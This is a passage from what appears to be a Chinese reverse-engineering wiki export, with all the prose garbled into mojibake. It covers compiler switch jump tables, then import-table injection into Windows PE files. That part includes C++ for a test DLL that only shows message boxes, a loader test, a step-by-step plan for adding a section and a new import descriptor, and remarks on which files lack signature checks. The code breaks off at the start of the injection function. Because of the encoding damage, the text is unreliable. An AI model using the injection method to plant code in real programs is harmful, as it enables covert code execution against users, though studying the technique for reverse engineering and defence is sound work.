‡å€¼ï¼Œæ‰¾åˆ°åœ°å€è¡¨ä¸­å¯¹åº”çš„caseè¯­å¥å—é¦–åœ°å€ 10040D7BF jmp dword ptr [edx*4+40D831h] å‡è®¾è¾“å…¥ç»™switchçš„å‚æ•°å€¼ä¸º1ï¼Œç¼–è¯‘å™¨å‡1è°ƒæ•´åˆ°caseåœ°å€æ•°ç»„çš„ä¸‹æ ‡0åã€‚ç¬¬ä¸€æ¬¡æŸ¥è¡¨ï¼ŒæŸ¥ç´¢å¼•è¡¨ï¼Œ(0040d849)[eax]å˜æˆäº†(0040d849)[0]ï¼Œä¸ºç´¢å¼•è¡¨ä¸­ç¬¬0é¡¹ï¼Œä¸º00ã€‚ç¬¬äºŒæ¬¡æŸ¥è¡¨ï¼ŒæŸ¥åœ°å€è¡¨ï¼Œ[edx*4+40D831h]å˜æˆäº†[0*4+40D831h]ï¼Œä¸ºè¡¨ä¸­ç¬¬0é¡¹ï¼Œå³case1è¯­å¥å—çš„èµ·å§‹åœ°å€ã€‚ å‡è®¾è¾“å…¥ç»™switchçš„å‚æ•°å€¼ä¸º2ï¼Œç¼–è¯‘å™¨å‡1è°ƒæ•´åˆ°caseåœ°å€æ•°ç»„çš„ä¸‹æ ‡1åã€‚ç¬¬ä¸€æ¬¡æŸ¥è¡¨ï¼ŒæŸ¥ç´¢å¼•è¡¨ï¼Œ(0040d849)[eax]å˜æˆäº†(0040d849)[1]ï¼Œä¸ºç´¢å¼•è¡¨ä¸­ç¬¬1é¡¹ï¼Œä¸º01ã€‚ç¬¬äºŒæ¬¡æŸ¥è¡¨ï¼ŒæŸ¥åœ°å€è¡¨ï¼Œ[edx*4+40D831h]å˜æˆäº†[1*4+40D831h]ï¼Œä¸ºè¡¨ä¸­ç¬¬1é¡¹ï¼Œå³case2è¯­å¥å—çš„èµ·å§‹åœ°å€ã€‚ â€¦ n -1è°ƒæ•´åçš„æ•°ç»„ä¸‹æ ‡ æ˜¯å¦å¤„äºcaseèŒƒå›´å†… (0040d849)[eax]çš„å€¼ ç´¢å¼•è¡¨è¡¨é¡¹ edx*4+40D831hçš„å€¼ åœ°å€è¡¨è¡¨é¡¹ è¡¨é¡¹çš„å«ä¹‰ ç¨‹åºçš„æ‰§è¡Œæµç¨‹ -1 -2ï¼ˆ-1-1=-2ï¼‰ è¡¥ç FFFFFFFEï¼Œæ¯”10å¤§ï¼Œè·³åˆ°default - - - - n=-1ï¼Œæ‰§è¡Œdefault 0 -1ï¼ˆ0-1=-1ï¼‰ è¡¥ç FFFFFFFFï¼Œæ¯”10å¤§ï¼Œè·³åˆ°default - - - - n=0ï¼Œæ‰§è¡Œdefault 1 0 &lt;=10ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… (0040d849)[0] 00 0*0+40D831h 0040D7C6 case1è¯­å¥å—çš„èµ·å§‹åœ°å€ n=1ï¼Œæ‰§è¡Œcase1 2 1 &lt;=10ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… (0040d849)[1] 01 0*1+40D831h 0040D7D5 case2è¯­å¥å—çš„èµ·å§‹åœ°å€ n=2ï¼Œæ‰§è¡Œcase2 3 2 &lt;=10ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… (0040d849)[2] 02 0*2+40D831h 0040D7E4 case3è¯­å¥å—çš„èµ·å§‹åœ°å€ n=3ï¼Œæ‰§è¡Œcase3 4 3 &lt;=10ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… (0040d849)[3] 05 0*3+40D831h 0040D811 defaultè¯­å¥å—èµ·å§‹åœ°å€ n=4ï¼Œæ‰§è¡Œdefault 5 4 &lt;=10ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… (0040d849)[4] 05 0*4+40D831h 0040D811 defaultè¯­å¥å—èµ·å§‹åœ°å€ n=5ï¼Œæ‰§è¡Œdefault â€¦ â€¦ â€¦ â€¦ 05 0*5+40D831h 0040D811 defaultè¯­å¥å—èµ·å§‹åœ°å€ n=â€¦ï¼Œæ‰§è¡Œdefault â€¦ â€¦ â€¦ â€¦ 05 0*5+40D831h 0040D811 defaultè¯­å¥å—èµ·å§‹åœ°å€ n=â€¦ï¼Œæ‰§è¡Œdefault 10 9 &lt;=10ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… (0040d849)[9] 03 0*3+40D831h 0040D7F3 case10è¯­å¥å—çš„èµ·å§‹åœ°å€ n=10ï¼Œæ‰§è¡Œcase10 11 10 &lt;=10ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… (0040d849)[0Ah] 04 0*4h+40D831h 0040D802 case11è¯­å¥å—çš„èµ·å§‹åœ°å€ n=11ï¼Œæ‰§è¡Œcase11 12 11 æ¯”10å¤§ï¼Œè·³åˆ°default - - - - n=12ï¼Œæ‰§è¡Œdefault å¯ä»¥çœ‹åˆ°ï¼Œç¼–è¯‘å™¨å¤šç”Ÿæˆä¸€ä¸ªå°è¡¨ï¼Œå°è¡¨ä¸­çš„æ¯ä¸ªè¡¨é¡¹å¤§å°1å­—èŠ‚ï¼Œå…ˆæŸ¥å°è¡¨å¾—åˆ°ç´¢å¼•å·ï¼Œç„¶åæŸ¥åœ°å€è¡¨å¾—åˆ°è¦å»å¾€çš„åœ°å€ã€‚ç”¨å°è¡¨1å­—èŠ‚çš„ç©ºé—´ï¼Œå…å»äº†ç”¨defaultè¯­å¥å—é¦–åœ°å€/switchè¯­å¥å—çš„ç»“æŸåœ°å€æ¥è¿ç»­å¡«å……å¤§è¡¨é—´éš™ï¼ˆæ¯é¡¹å 4å­—èŠ‚ï¼‰ï¼ŒèŠ‚çœäº†å†…å­˜ç©ºé—´ã€‚ä½†è¿™ç§æ–¹æ¡ˆæ‰§è¡Œæ—¶è¦æ¯”å•ä¸€çš„å¤§è¡¨å¤šä¸€æ¬¡æŸ¥è¡¨çš„è¿‡ç¨‹ï¼Œå› æ­¤æ•ˆç‡ä¼šæœ‰æ‰€ä¸‹é™ã€‚ å½“caseå€¼ä¸ªæ•°&gt;å°è¡¨èƒ½è¡¨ç¤ºçš„256ä¸ªåï¼Œç”¨å¹³è¡¡äºŒå‰æ ‘ã€‚ èƒ½å¦è®©å°è¡¨ä¸­æ¯ä¸ªè¡¨é¡¹ç”¨2å­—èŠ‚æ¥è¡¨ç¤ºå‘¢ï¼Ÿå…¶å®å¯ä»¥ï¼Œä½†å’Œåˆ¶ä½œå•ä¸€çš„å¤§è¡¨ç›¸æ¯”ï¼Œå…¶å®èŠ‚çœä¸‹æ¥çš„ç©ºé—´ä¹Ÿä¸æ˜¯å¾ˆå¤šã€‚ å¤§è¡¨+å°è¡¨å ç”¨çš„æ€»å­—èŠ‚æ•°=åœ°å€è¡¨å¤§å°+ç´¢å¼•è¡¨å¤§å°=SUM*4å­—èŠ‚+ï¼ˆMAX-MINï¼‰*1å­—èŠ‚ åœ°å€è¡¨å¤§å°=SUM*4å­—èŠ‚ ç´¢å¼•è¡¨å¤§å°=ï¼ˆMAX-MINï¼‰*1å­—èŠ‚ å…¶ä¸­ï¼Œ MAXè¡¨ç¤ºæœ€å¤§çš„caseå€¼ MINè¡¨ç¤ºæœ€å°çš„caseå€¼ SUMè¡¨ç¤ºcaseæ€»æ•°+1ï¼ˆåŒ…å«defaultï¼‰ å°ç»“ ç»“æ„è¯†åˆ«ï¼š è·å–æŸä¸€ä¸ªå€¼è¿›è¡Œè°ƒæ•´ï¼ˆå¯èƒ½æ²¡è°ƒæ•´è¿™ä¸€æ­¥ï¼‰ è·³è½¬æŒ‡ä»¤jccè¿›è¡ŒèŒƒå›´æ£€æŸ¥ å¦‚æœä¸åœ¨è¿™ä¸ªèŒƒå›´ï¼Œåˆ™è·³èµ° å¦‚æœåœ¨è¿™ä¸ªèŒƒå›´ï¼Œåˆ™ä¸è·³èµ°ï¼Œç»§ç»­æ‰§è¡Œ è·³è½¬æŒ‡ä»¤åæœ‰äºŒæ¬¡æŸ¥è¡¨çš„è¿‡ç¨‹ ç¬¬ä¸€æ¬¡æŸ¥è¡¨ä»£ç ï¼Œå¾—åˆ°å•å­—èŠ‚æ•°æ®ï¼›ç„¶ååˆ†ææ˜¯å¦ä½¿ç”¨äº†ç¬¬ä¸€æ¬¡æŸ¥è¡¨ä¸­è·å–çš„å•å­—èŠ‚æ•°æ®ä½œä¸ºä¸‹æ ‡ï¼Œä»è€Œä½¿ç”¨ç›¸å¯¹æ¯”ä¾‹å› å­å¯»å€æ–¹å¼è¿›è¡Œç¬¬äºŒæ¬¡æŸ¥è¡¨ï¼›æœ€åæ£€æŸ¥åŸºå€æŒ‡å‘çš„æ˜¯å¦æ˜¯åœ°å€è¡¨ã€‚ 1234567891011121314;è°ƒæ•´mov reg,mem ;å–å‡ºswitchå˜é‡sub reg,1 ;è°ƒæ•´å¯¹é½åˆ°ç´¢å¼•è¡¨ä¸‹æ ‡0ï¼Œæœ‰å¯èƒ½æ²¡æœ‰è¿™ä¸€æ­¥mov mem,reg;ä¸‹æ ‡æ£€æŸ¥... ;å½±å“æ ‡è®°ä½çš„æŒ‡ä»¤jxx xxxx ;è¶…å‡ºèŒƒå›´åˆ™è·³è½¬åˆ°switchç»“å°¾æˆ–default;æŸ¥è¡¨mov reg,[mem] ;å–å‡ºswitchå˜é‡xor eax,eax ;eaxä¸æ˜¯å¿…é¡»ä½¿ç”¨çš„ï¼Œä½†ä¹‹åçš„æ•°ç»„æŸ¥è¯¢ç”¨åˆ°çš„å¯„å­˜å™¨ä¸€å®šæ˜¯æ­¤å¤„ä½¿ç”¨åˆ°çš„å¯„å­˜å™¨mov al,byte ptr (xxxx)[reg] ;æŸ¥ç´¢å¼•è¡¨ï¼Œå¾—åˆ°åœ°å€è¡¨çš„ä¸‹æ ‡jmp dword ptr [eax*4+xxxx] ;æŸ¥åœ°å€è¡¨ï¼Œå¾—åˆ°å¯¹åº”caseå—çš„é¦–åœ°å€ ç´¢å¼•è¡¨ èµ·å§‹åœ°å€ï¼šä»æŸä¸ªåŸºå€å¼€å§‹+åç§»ï¼Œå–byteç±»å‹æ•°æ® caseåœ°å€è¡¨ èµ·å§‹åœ°å€ï¼šç›¸å¯¹æ¯”ä¾‹å› å­å¯»å€æ–¹å¼ä¸­çš„åŸºå€ defaultè¯­å¥é¦–åœ°å€/switchç»“æŸåœ°å€ ç”±èŒƒå›´æ£€æŸ¥jccçš„åœ°å€ç¡®å®š ç´¢å¼•è¡¨ä¸­é‡å¤çš„é¡¹ ç´¢å¼•è¡¨ä¸­é‡å¤çš„é¡¹æ˜¯switchçš„ç»“æŸåœ°å€/defaultè¯­å¥å—çš„é¦–åœ°å€çš„ä¸‹æ ‡ï¼› ç‹¬ç«‹çš„é¡¹ï¼Œåˆ™ä¸æ˜¯ã€‚ åœ¨å¤šä¸ªcaseå…±ç”¨ä¸€ä¸ªè¯­å¥å—æ—¶ï¼Œç´¢å¼•è¡¨ä¸­ä¹Ÿä¼šå‡ºç°ç›¸åŒæ ‡å·ã€‚å¦‚ï¼š 1234case 1:case 2:\txxxx;\tbreak; ç”±äºcase1ä¸­æ²¡æœ‰ä»»ä½•ä»£ç ï¼Œå½“æ‰§è¡Œåˆ°å®ƒæ—¶ï¼Œå°±ä¼šé¡ºåºå‘ä¸‹ï¼Œç›´åˆ°ä¸‹ä¸€ä¸ªcaseè¯­å¥ä¸ä¸ºç©ºä¸ºæ­¢ã€‚ caseè¯­å¥å— caseçš„åˆ¤å®šå€¼å’Œå¯¹åº”è¯­å¥å—çš„åœ°å€ ç»“åˆç´¢å¼•è¡¨å’Œåœ°å€è¡¨è¿›è¡Œåˆ†æã€‚ç´¢å¼•è¡¨ä¸­çš„ä¸‹æ ‡æ˜¯è°ƒæ•´åçš„ä¸‹æ ‡ï¼Œæ‰€ä»¥å°†ç´¢å¼•è¡¨ä¸­çš„ä¸‹æ ‡+åå‘è°ƒæ•´ï¼ˆè°ƒæ•´æ•°ç»„ä¸‹æ ‡æ—¶ç›¸åçš„æ“ä½œï¼‰å°±èƒ½å¾—åˆ°caseçš„æ ‡å·å€¼ã€‚é€šè¿‡ç´¢å¼•è¡¨ä¸­çš„ä¸‹æ ‡åœ¨åœ°å€è¡¨ä¸­æ‰¾å°±å¯ä»¥æ‰¾åˆ°å¯¹åº”caseè¯­å¥å—çš„èµ·å§‹åœ°å€ã€‚ ä¾‹ï¼š ç´¢å¼•è¡¨ä¸­ç¬¬0é¡¹å†…å®¹ä¸º00ï¼Œåœ¨è¡¨ä¸­æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„æ•°æ®ï¼Œè¯´æ˜ä¸æ˜¯switchçš„ç»“æŸåœ°å€/defaultè¯­å¥å—çš„é¦–åœ°å€ä¸‹æ ‡ï¼Œæ˜¯caseè¯­å¥å—ä¸‹æ ‡ã€‚00å¯¹åˆ°åœ°å€è¡¨ç¬¬0é¡¹ï¼Œåœ°å€è¡¨å†…å®¹æ˜¯0040D7C6ï¼Œè¡¨ç¤ºcase1è¯­å¥å—çš„èµ·å§‹åœ°å€ã€‚å°†ç´¢å¼•è¡¨å†…å®¹åå‘è°ƒæ•´ï¼Œå°±èƒ½å¾—åˆ°caseåˆ¤å®šå€¼ï¼šï¼ˆ0+1=1ï¼‰1ã€‚ ç´¢å¼•è¡¨ä¸­ç¬¬3é¡¹å†…å®¹ä¸º05ï¼Œåœ¨è¡¨ä¸­é‡å¤å‡ºç°ï¼Œè¯´æ˜æ˜¯switchçš„ç»“æŸåœ°å€/defaultè¯­å¥å—çš„é¦–åœ°å€ä¸‹æ ‡ã€‚05å¯¹åˆ°åœ°å€è¡¨ç¬¬5é¡¹ï¼Œåœ°å€è¡¨å†…å®¹æ˜¯0040D811ï¼Œè¡¨ç¤ºswitchçš„ç»“æŸåœ°å€/defaultè¯­å¥å—çš„é¦–åœ°å€ã€‚ ç´¢å¼•è¡¨é¡¹æ•° ç´¢å¼•è¡¨å†…å®¹ ç´¢å¼•è¡¨å†…å®¹é‡å¤å‡ºç°orç‹¬ç«‹å‡ºç° å¯¹åº”çš„åœ°å€è¡¨å†…å®¹ åœ°å€è¡¨å†…å®¹å«ä¹‰ åå‘è°ƒæ•´å¾—åˆ°caseæ ‡å·å€¼ ç¬¬0é¡¹ 00 ç‹¬ç«‹å‡ºç°ï¼Œè¯´æ˜æ˜¯caseè¯­å¥å—ä¸‹æ ‡ï¼Œè€Œä¸æ˜¯switchçš„ç»“æŸåœ°å€/defaultè¯­å¥å—çš„é¦–åœ°å€ä¸‹æ ‡ 0040D7C6 case1è¯­å¥å—çš„èµ·å§‹åœ°å€ 0+1=1 ç¬¬3é¡¹ 05 é‡å¤å‡ºç°ï¼Œä¸ºswitchçš„ç»“æŸåœ°å€/defaultè¯­å¥å—çš„é¦–åœ°å€ä¸‹æ ‡ 0040D811 defaultè¯­å¥å—é¦–åœ°å€ 05+1=6 ç»“æŸåœ°å€ ä¸¤ä¸ªcaseèµ·å§‹åœ°å€ä¹‹é—´ äºŒå‰æ ‘ å®é™…ä¸Šï¼Œæ¯”è¾ƒå°‘è§ æ€»ç»“ caseåˆ†æ”¯æ•°â‰¤3ï¼Œé‡‡ç”¨æ¨¡æ‹Ÿifâ€¦else ifç»“æ„å®ç°ç›¸åŒåŠŸèƒ½ã€‚ caseåˆ†æ”¯æ•°&gt;3ï¼Œä¸”caseåˆ¤å®šå€¼å­˜åœ¨æ˜æ˜¾çº¿æ€§å…³ç³»æ—¶ï¼š é—´éš™â‰¤6ï¼Œå¤§è¡¨ é—´éš™&gt;6 ä¸”caseæœ€å¤§æœ€å°å·®å€¼&lt;255æ—¶ï¼Œå¤§è¡¨+å°è¡¨ caseæœ€å¤§æœ€å°å·®å€¼&gt;255æ—¶ï¼Œå¹³è¡¡äºŒå‰æ ‘ æ¯«ä¸è¿ç»­çš„å€¼ï¼Œå¹³è¡¡äºŒå‰æ ‘ï¼ˆå¾…æŸ¥è¯ï¼‰"},{"title":"å¯¼å…¥è¡¨æ³¨å…¥","path":"/wiki/Injection/å¯¼å…¥è¡¨æ³¨å…¥.html","content":"å¯¼å…¥è¡¨æ³¨å…¥åŸç† exeåŠ è½½æ—¶ï¼Œç³»ç»ŸåŠ è½½å™¨æ ¹æ®å®ƒçš„å¯¼å…¥è¡¨å°†éœ€è¦ç”¨åˆ°çš„dllè½½å…¥åˆ°è¿›ç¨‹ç©ºé—´ä¸­ã€‚æ¯ä¸€å¼ å¯¼å…¥è¡¨ï¼Œå¯¹åº”ä¸€ä¸ªéœ€è¦ç”¨åˆ°çš„dllã€‚å¯¼å…¥è¡¨æ³¨å…¥å°±æ˜¯æ–°å¢ä¸€å¼ å¯¼å…¥è¡¨ï¼Œè¿™ä¸ªè¡¨é¡¹æè¿°è‡ªå·±çš„dllã€‚å¦‚æ­¤ï¼Œç›®æ ‡exeè¿è¡Œæ—¶ï¼Œç³»ç»ŸåŠ è½½å™¨ä¾¿ä¼šå°†æˆ‘ä»¬è‡ªå·±çš„è¿™ä¸ªdllä¹ŸåŠ è½½åˆ°è¿›ç¨‹ç©ºé—´ä¸­ã€‚ ä¸€äº›ç»†èŠ‚é—®é¢˜ éœ€è¦ç§»åŠ¨å¯¼å…¥è¡¨ï¼šå¯¼å…¥è¡¨æ··åœ¨èŠ‚æ•°æ®ä¸­ï¼Œç°æœ‰çš„å¯¼å…¥è¡¨åä¸å¤Ÿç©ºé—´æ–°å¢ä¸€å¼ å¯¼å…¥è¡¨ï¼Œæ‰€ä»¥è¦ç§»åŠ¨å¯¼å…¥è¡¨ã€‚ç§»åŠ¨çš„è¯åªç§»åŠ¨å¯¼å…¥è¡¨å³å¯ æ–°å¢è¦å…¨å¥—ï¼šå³ä½¿åŠ äº†ä¸€å¼ å¯¼å…¥è¡¨æ¥æè¿°è‡ªå·±çš„dllï¼Œä½†å¦‚æœå®ƒçš„OriFirstThunkå’ŒFirstThunkæ˜¯ç©ºçš„ï¼Œå½“è¿™ä¸ªexeè¿è¡Œæ—¶ï¼Œè¿™ä¸ªdllä¹Ÿä¸ä¼šè¢«åŠ è½½åˆ°exeä¸­ã€‚INTå’ŒIATè¡¨è‡³å°‘è¦æœ‰ä¸€é¡¹æœ‰æ•ˆçš„å¯¼å…¥å‡½æ•°æ¡ç›®ï¼Œè¿™ä¸€å¯¼å…¥å‡½æ•°é¡¹æ˜¯ä¸ºäº†å½¢æˆä¸€ä¸ªå®Œæ•´çš„å¯¼å…¥è¡¨ï¼Œå¹¶ä¸éœ€è¦exeçœŸçš„ç”¨åˆ°è¿™ä¸ªå¯¼å…¥å‡½æ•°ã€‚ è¿™ä¸ªå¯¼å…¥å‡½æ•°è¦åœ¨dllä¸­å®é™…å­˜åœ¨ã€‚å¦‚æœæ˜¯éšä¾¿å†™çš„ï¼Œè€Œdllä¸­ä¸å­˜åœ¨ï¼Œè¿è¡Œexeæ—¶ä¼šæŠ¥0xC0000007bï¼Œå¦‚ä¸‹å›¾ åŸæœ‰å¯¼å…¥è¡¨å¯¼å…¥è¡¨æ³¨å…¥å çº¢è‰²éƒ¨åˆ†ä¸ºè‡ªå·±æ–°å¢çš„ Hinté‚£é‡Œå¡«é›¶å³å¯ï¼Œä¹Ÿå¯ä»¥ç®—ä¸€ä¸‹å†å¡« æ–°å¢ä¸€ä¸ªå…¨å¥—å¯¼å…¥è¡¨ä¿¡æ¯éœ€è¦çš„ç©ºé—´å¤§å°ï¼š Aï¼šä¸€å¼ å¯¼å…¥è¡¨ï¼Œ20ä¸ªå­—èŠ‚ Bï¼šINTè¡¨ï¼ˆä¸€é¡¹+ç»“å°¾ï¼‰ï¼Œä¸¤ä¸ª8å­—èŠ‚ Cï¼šIATè¡¨ï¼ˆä¸€é¡¹+ç»“å°¾ï¼‰ï¼Œä¸¤ä¸ª8å­—èŠ‚ Dï¼šæç¤ºåè¡¨ï¼Œ2å­—èŠ‚çš„Hint + å­—ç¬¦ä¸²é•¿åº¦ + 1 Bï¼ŒCï¼ŒDå¯ä»¥å¦æ‰¾åœ°æ–¹æ”¾ã€‚ å‡è®¾åŸæ¥çš„IIDæ•°ç»„å¤§å°ä¸ºOldIIDSizeï¼ˆè¿™ä¸ªå€¼å°±æ˜¯æ•°æ®ç›®å½•è¡¨ä¸­å¯¼å…¥è¡¨çš„Sizeå€¼ï¼Œè¿™ä¸ªå€¼ç®—ä¸Šäº†ç»“å°¾çš„20å­—èŠ‚ç©ºç»“æ„ä½“ï¼‰ï¼Œé‚£ä¹ˆæ‰¾ä¸€ä¸ªç©ºç™½åŒºæ”¾ç§»åŠ¨åçš„IIDæ•°ç»„ï¼Œè‡³å°‘è¦NewIIDSize=OldIIDSize+20å­—èŠ‚ï¼ˆæ–°å¢çš„å¯¼å…¥è¡¨ï¼‰çš„å¤§å°ã€‚æ‰¾ç©ºç™½åŒºå¯ä»¥å†™ä¸€ä¸ªå‡½æ•°æŒ‰æŒ‡å®šé•¿åº¦åœ¨PEæ–‡ä»¶çš„ç©ºç™½åŒºä¸­æ‰¾ï¼Œæˆ–è€…é€šè¿‡æ‰©å¤§èŠ‚ï¼Œæ–°å¢èŠ‚æ¥è§£å†³ã€‚ åé¢çš„ä»£ç å®ç°ç›´æ¥æ˜¯æ–°å¢èŠ‚æ¥è§£å†³ IATè¡¨å­˜æ”¾çš„ä½ç½®è¦å¯å†™ã€‚å› ä¸ºç³»ç»ŸåŠ è½½å™¨åŠ è½½PEæ—¶ä¼šè¿›è¡ŒIATè¡¨æ›¿æ¢å·¥ä½œï¼Œå¦‚æœä¸å¯å†™ï¼ŒåŠ è½½æ—¶ä¼šæŠ¥é”™ã€‚ å¦‚æœç›®æ ‡exeæœ¬èº«å­˜åœ¨ç»‘å®šå¯¼å…¥è¡¨ï¼Œéœ€è¦å°†æ•°æ®ç›®å½•è¡¨ä¸­å…³äºç»‘å®šå¯¼å…¥è¡¨çš„ä¿¡æ¯æ¸…é›¶ã€‚è®©å®ƒåŠ è½½æ—¶å¼ºåˆ¶é‡æ–°æ›¿æ¢IATè¡¨ã€‚ å¯¹æŠ—æ€§ è¿™ç§ç›´æ¥ä¿®æ”¹PEæ–‡ä»¶è¾“äººè¡¨çš„æ–¹æ³•ï¼Œé€‚ç”¨äºEXEæœ¬èº«æ— æ ¡éªŒï¼ˆCRCã€æ•°å­—ç­¾åæˆ–å…¶ä»–æ ¡éªŒç®—æ³•ï¼‰çš„æƒ…å†µã€‚å› ä¸ºè¾“äººè¡¨çš„åŠ è½½è¿‡ç¨‹æ˜¯é€’å½’çš„ï¼Œæ‰€ä»¥å‡å¦‚EXEæœ¬èº«æœ‰æ ¡éªŒï¼Œè€Œå®ƒæ‰€åŠ è½½çš„æŸä¸ªç¬¬ä¸‰æ–¹æ¨¡å—æ— æ ¡éªŒï¼Œé‚£ä¹ˆä¿®æ”¹ç¬¬ä¸‰æ–¹æ¨¡å—çš„è¾“äººè¡¨ä¸€æ ·å¯ä»¥è¾¾åˆ°æ³¨äººç›®æ ‡è¿›ç¨‹çš„ç›®çš„ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ‰€æœ‰æ¨¡å—éƒ½æœ‰æ ¡éªŒï¼Œå°±ä¸èƒ½ç›´æ¥ä¿®æ”¹æ–‡ä»¶äº†ï¼Œè€Œåº”è¯¥é‡‡ç”¨è¿›ç¨‹åˆ›å»ºæœŸä¿®æ”¹PEè¾“äººè¡¨çš„æ–¹æ³•ã€‚ ã€ŠåŠ å¯†ä¸è§£å¯†4thã€‹P455 ä»£ç å®ç° æµ‹è¯•çš„dll Fun.hå’ŒFun.cppdllmain.cppFun.h12345#pragma oncevoid Init();void Destroy();extern &quot;C&quot; _declspec(dllexport) void ExportFunction(); Fun.cpp1234567891011121314151617#include &lt;Windows.h&gt;#include &quot;Fun.h&quot;void Init()&#123;\tMessageBox(0, TEXT(&quot;Init&quot;), TEXT(&quot;Init&quot;), MB_OK);&#125;void Destroy()&#123;\tMessageBox(0, TEXT(&quot;Destroy&quot;), TEXT(&quot;Destroy&quot;), MB_OK);&#125;void ExportFunction()&#123;\tMessageBox(0, TEXT(&quot;ExportFunction&quot;), TEXT(&quot;ExportFunction&quot;), MB_OK);&#125;DLL_PROCESS_ATTACHï¼š dllè¢«åŠ è½½æ—¶ä¼šè¢«è°ƒç”¨ ä¸»åŠ¨ç”¨LoadLibraryåŠ è½½è¿™ä¸ªdllæ—¶ä¼šè¢«è°ƒç”¨ 1HINSTANCE hModule = LoadLibrary(&quot;InjectDll.dll&quot;); DLL_PROCESS_DETACHï¼š dllè¢«é”€æ¯æ—¶ä¼šè¢«è°ƒç”¨ ä»£ç æ˜¾å¼å¸è½½æ—¶ä¼šè¢«è°ƒç”¨ 1FreeLibrary(hModule); dllmain.cpp123456789101112131415161718192021222324#include &lt;Windows.h&gt;#include &quot;Fun.h&quot;BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: Init(); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: Destroy(); break; &#125; return TRUE;&#125; æµ‹è¯•æ–¹æ³• ç”¨DependenciesGuièƒ½çœ‹åˆ°å¯¼å‡ºå‡½æ•°è¢«å¯¼å‡º æ–°å»ºå¦ä¸€ä¸ªå·¥ç¨‹ï¼Œçœ‹èƒ½å¦æ­£å¸¸æ˜¾å¼åŠ è½½ï¼Œè°ƒç”¨å¯¼å‡ºå‡½æ•°ï¼Œå¸è½½è¿™ä¸ªdll ç”¨äºæµ‹è¯•åˆšæ‰çš„dll1234567891011121314151617181920212223242526272829303132333435#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123;\ttypedef void (*lpTest)();\tlpTest MyFunction;\t//åŠ è½½DLL\t//HINSTANCE hModule = LoadLibrary(&quot;E:\\\\temp\\\\IATInjection.dll&quot;);\tHINSTANCE hModule = LoadLibrary(&quot;D:\\\\005_Codefield\\\\VS2019\\\\IATHook_Dll\\\\Debug\\\\IATInjection_Dll.dll&quot;);\tif (hModule == NULL)\t&#123; printf(&quot;[!] Failed to load IATInjection.dll &quot;); return 0;\t&#125;\t//è·å–å‡½æ•°åœ°å€\tMyFunction = (lpTest)GetProcAddress(hModule, &quot;ExportFunction&quot;);\tif (MyFunction == NULL)\t&#123; printf(&quot;[!] Failed to get the address of ExportFunction &quot;); FreeLibrary(hModule); return 0;\t&#125;\t//è°ƒç”¨å‡½æ•°\tMyFunction();\t//é‡Šæ”¾DLL\tFreeLibrary(hModule);\treturn 0;&#125; èƒ½çœ‹åˆ°ä¸‰ä¸ªå¼¹çª—ï¼Œè¯´æ˜è¿™ä¸ªdllæ˜¯okçš„ ç¨‹åºæµç¨‹è®¾è®¡ è·å¾—ç›®æ ‡exeæ–‡ä»¶çš„m_lpFileBufferæ–‡ä»¶å†…å­˜æ˜ åƒï¼ˆæœªæ‹‰ä¼¸ï¼‰ï¼Œè·å–ç›¸å…³PEæŒ‡é’ˆ å¯¹m_lpFileBufferæ–°å¢å¤§å°ä¸º0x1000çš„èŠ‚ï¼Œè¿”å›å‡ºlpNewBufferï¼ˆæœªæ‹‰ä¼¸ï¼‰ åœ¨lpNewBufferä¸Šç§»åŠ¨å¯¼å…¥è¡¨åˆ°æ–°èŠ‚ å…·ä½“åšæ³•æ˜¯ï¼š éå†å¯¼å…¥è¡¨ï¼Œç»Ÿè®¡ä¸ªæ•°ï¼Œå°†å¯¼å…¥è¡¨æ‹·èµ°ï¼Œè®°å½•æ–°å¯¼å…¥è¡¨çš„RVA åœ¨ç°æœ‰å¯¼å…¥è¡¨åæ–°å¢ä¸€å¼ å¯¼å…¥è¡¨ æ‰¾åœ°æ–¹æ”¾INTè¡¨ï¼ŒIATè¡¨ï¼Œæç¤ºåè¡¨ï¼ŒNameå­—æ®µ æ›´æ–°INTè¡¨è¡¨é¡¹ï¼Œæ›´æ–°IATè¡¨è¡¨é¡¹ æ›´æ–°è‡ªå·±è¿½åŠ çš„å¯¼å…¥è¡¨çš„å­—æ®µ æ›´æ–°æ•°æ®ç›®å½•é¡¹ä¸­é‡å®šä½è¡¨çš„RVAåœ°å€æŒ‡å‘å’ŒSize è¯´å¾—æŠ½è±¡ç‚¹ï¼š 1231ã€ç§»åŠ¨2ã€è®°å½•ä½ç½®3ã€æ›´æ–°å­—æ®µ å°†lpNewBufferå­˜ç›˜ æ£€éªŒåŠæ³•ï¼šè¿è¡Œä¿®æ”¹åçš„exeï¼Œçœ‹è‡ªå·±çš„dllæ˜¯å¦è¢«æ‰§è¡Œ ç¼–ç¨‹å®ç° æµ‹è¯•å‡½æ•° å¤§è‡´æµç¨‹1234567891011121314151617181920212223242526272829303132333435int TestIATInjection()&#123; //å†™æ­»çš„ï¼Œæ–¹ä¾¿æµ‹è¯•ç”¨ PEManipulator PEFile(&quot;E:\\\\temp\\\\IATInjection\\\\fg.exe&quot;); //æ–‡ä»¶å¯¹é½=å†…å­˜å¯¹é½ if (!PEFile.MapPEFile() || !PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; //æ–°å¢èŠ‚ LPVOID lpNewBuffer = PEFile.AddANewSection(0x1000); //æ–°èŠ‚ç›´æ¥0x1000ï¼Œä¹Ÿå¯ä»¥å…ˆç®—ä¸€éï¼ŒæŒ‰éœ€æ–°å¢èŠ‚çš„å¤§å° if (!lpNewBuffer) &#123; return 1; &#125; INVOKE_ON_EXIT([&amp;] &#123; delete[] lpNewBuffer; &#125;); printf(&quot;[+] AddANewSection for m_lpFileBuffer successfully. &quot;); 